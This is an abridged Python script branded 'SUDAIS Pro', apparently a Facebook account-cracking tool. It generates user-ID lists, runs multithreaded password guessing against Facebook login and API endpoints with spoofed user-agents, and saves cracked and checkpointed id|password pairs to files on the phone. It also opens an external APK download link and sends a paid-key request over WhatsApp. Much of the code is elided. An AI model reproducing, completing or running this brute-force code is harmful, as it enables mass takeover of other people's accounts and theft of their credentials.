...
----------------------------------------------
 Author    : SUDAIS AHMED
 Github    : SUDAIS AHMED
 Facebook  : SUDAIS AHMED
 Tool Name : SUDAIS AHMED
 Type type : free
 Version   : 0.0
----------------------------------------------
 SUDAIS Pro version 0.0
 For Haters: Tumhare Okat Nhi Mere🤞
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
...
def login():
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}, cookies = {"cookie":cookies})
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/SUDAIS_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                        ...
                        linex()
                        tks = ("Hi SUDAIS Sir, I Need To Buy Your Paid SUDAIS PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python SUDAIS.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as SUDAIS:     
                        clear()
                        tl = str(len(user))
                        ...
                        for psx in user:
                                ...
                                SUDAIS.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [SUDAIS-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        SUDAIS=session.cookies.get_dict().keys()
                        if "c_user" in SUDAIS:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [SUDAIS-OK] %s | %s'%(ids,pas))
                                open('/sdcard/SUDAIS-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in SUDAIS:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [SUDAIS-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SUDAIS-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [SUDAIS-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SUDAIS-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/SUDAIS-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [SUDAIS-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/SUDAIS-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [SUDAIS-OK] '+uid+' | '+pas+'\033[1;97m')
